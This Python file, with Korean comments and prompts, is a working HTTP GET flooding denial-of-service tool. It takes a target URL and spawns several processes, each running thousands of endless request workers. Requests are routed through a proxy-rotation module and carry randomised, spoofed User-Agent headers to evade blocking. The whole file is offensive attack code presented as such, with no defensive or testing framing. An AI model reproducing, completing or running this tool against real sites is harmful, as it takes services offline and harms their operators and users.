import random
import asyncio
import os
from multiprocessing import Process
from collections import Counter
import aiohttp
from colorama import Fore
import Proxy        # 프록시 레이어 모듈 (대문자 Proxy.py)

PROCESS_COUNT = 5        # 띄울 프로세스 수 (보통 CPU 코어 수)
WORKERS_PER_PROC = 5000  # 프로세스당 동시 워커(코루틴) 수
REQUEST_TIMEOUT = 2      # 요청 타임아웃(초). 짧을수록 죽은 연결 빨리 버림
REPORT_INTERVAL = 1      # 집계 출력 간격(초)

ACCEPT_LANGUAGES = ["en-US,en;q=0.9", "ko-KR,ko;q=0.9", "ja-JP,ja;q=0.9"]

# User-Agent 헤더값

USER_AGENTS = [ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
               "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
               "Opera/9.20 (Windows NT 6.0; U; en)",
               "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
               "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
               "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
               "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
               "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
               "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
               "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
               "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
               "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
               "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
               "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
               "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51' ]


class Dos:
    def __init__(self):
        self.stats = Counter()

    def _random_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        }

    async def fetch(self, session, url):
        mgr = Proxy.active()
        p = None
        proxy_url = None
        try:
            if mgr:
                _, p = mgr.requests_proxies()
                if p is None:
                    self.stats["no_proxy"] += 1
                    return
                proxy_url = p.url

            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            async with session.get(
                    url,
                    headers=self._random_headers(),
                    timeout=timeout,
                    proxy=proxy_url
            ) as r:
                self.stats[r.status] += 1
                if mgr:
                    mgr.report(p, r.status < 400)
                return r.status
        except asyncio.CancelledError:
            raise
        except Proxy.ProxyExhausted:
            self.stats["no_proxy"] += 1
            return

        except Exception as e:
            self.stats[type(e).__name__] += 1
            if mgr:
                mgr.report(p, False)

    async def worker(self, session, url):
        try:
            while True:  # 워커 하나가 끝없이 반복
                await self.fetch(session, url)
        except asyncio.CancelledError:
            pass

    async def reporter(self, url):
        try:
            while True:
                await asyncio.sleep(REPORT_INTERVAL)
                total = sum(self.stats.values())
                ok = self.stats.get(200, 0)
                to = self.stats.get("TimeoutError", 0)
                print(
                    f"[{Fore.GREEN}PID {os.getpid()}{Fore.RESET}] {url} Dos Attack...  {Fore.GREEN}ALL {total} | 200:{ok} | timeout:{to}{Fore.RESET}")
        except asyncio.CancelledError:
            pass

    async def main(self, url, n=WORKERS_PER_PROC):
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            rep = asyncio.create_task(self.reporter(url))
            workers = [asyncio.create_task(self.worker(session, url)) for _ in range(n)]
            try:
                await asyncio.gather(*workers)
            except asyncio.CancelledError:
                pass
            finally:
                rep.cancel()
                await asyncio.gather(rep, return_exceptions=True)

    def run_async(self, url, workers, proxy_on=False):
        if proxy_on:
            Proxy.enable_from_config()
        # 윈도우 Proactor 소켓 정리 시 나오는 무해한 ConnectionResetError 억제
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.set_exception_handler(lambda l, c: None)  # 콜백 예외 조용히 무시
        try:
            loop.run_until_complete(self.main(url, n=workers))
        except KeyboardInterrupt:
            pass
        finally:
            loop.close()
        print(f"[PID {os.getpid()}] {dict(self.stats)}")

    def process_requests(self, url, process=PROCESS_COUNT, workers=WORKERS_PER_PROC):
        proxy_on = Proxy.active() is not None

        processes = [Process(target=self.run_async, args=(url, workers, proxy_on)) for _ in range(process)]
        for p in processes:
            p.start()
        try:
            for p in processes:
                p.join()
        except KeyboardInterrupt:
            print("\n[Ctrl+C] 전체 종료 중...")
            for p in processes:
                p.terminate()
            for p in processes:
                p.join()

    def run(self, tokens):
        mode = None
        processes = PROCESS_COUNT
        workers = WORKERS_PER_PROC
        url = None

        for arg in tokens[1:]:
            if arg == "--http":
                mode = "get_flooding"
            elif arg.startswith("p="):
                processes = self._parse_int(arg[2:], "p")
            elif arg.startswith("a="):
                workers = self._parse_int(arg[2:], "a")
            elif arg.startswith("-"):
                print(f"[!] 알 수 없는 옵션: {arg}")
                return
            else:
                if arg.startswith(("http://", "https://")):
                    url = arg
                else:
                    print(f"[!] URL은 http:// 또는 https://로 시작해야 합니다: {arg}")
                    return

        if mode is None:
            print("[!] 공격 모드를 지정하세요 (--http: HTTP GET flooding)")
            return
        if url is None:
            print("[!] URL이 필요합니다")
            return
        if processes is None or workers is None:
            return

        print(f"[*] {mode} 시작 → {url} (프로세스 {processes} × 워커 {workers})")
        if mode == "get_flooding":
            self.process_requests(url, process=processes, workers=workers)

    @staticmethod
    def _parse_int(value, name):
        try:
            n = int(value)
            if n <= 0:
                print(f"[!] {name} 값은 1 이상이어야 합니다: {value}")
                return None
            return n
        except ValueError:
            print(f"[!] {name} 값이 숫자가 아닙니다: {value}")
            return None


if __name__ == '__main__':
    test = input("명령 입력 (예: dos --http p=2 a=1000 http://target): ").split()
    Dos().run(test)
